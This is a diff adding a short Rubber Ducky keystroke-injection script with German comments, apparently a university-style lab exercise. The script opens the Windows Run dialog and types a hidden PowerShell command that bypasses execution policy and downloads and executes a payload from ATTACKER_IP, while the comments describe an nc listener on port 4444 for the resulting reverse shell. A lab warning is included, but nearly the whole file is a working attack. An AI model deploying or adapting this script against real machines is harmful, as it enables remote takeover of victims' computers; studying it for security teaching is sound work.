@@ -1,0 +1,24 @@
+REM ============================================================
+REM  W02a.5 – Rubber Ducky: Reverse Shell (Erweiterung von W02a.4)
+REM  Autoren: Raphael Bleier, Joachim Lugger
+REM  Ziel-OS: Windows
+REM  Beschreibung: Lädt das Reverse-Shell-Script vom Webserver.
+REM                Das externe Script (reverse_shell.ps1) baut
+REM                die Verbindung zurück zum Angreifer auf.
+REM
+REM  Voraussetzung:
+REM    1. nc -lvp 4444  (Listener auf Angreifer-Maschine starten)
+REM    2. Python-Server hostet reverse_shell.ps1 unter /payload.ps1
+REM  Ersetze ATTACKER_IP mit der echten IP-Adresse!
+REM
+REM  WARNUNG: Nur in gesicherter Laborumgebung verwenden!
+REM           Trellix Endpoint Security wird höchstwahrscheinlich
+REM           anschlagen und den Rechner vom Netz trennen!
+REM ============================================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRINGLN powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:8080/payload.ps1')"
+DELAY 5000
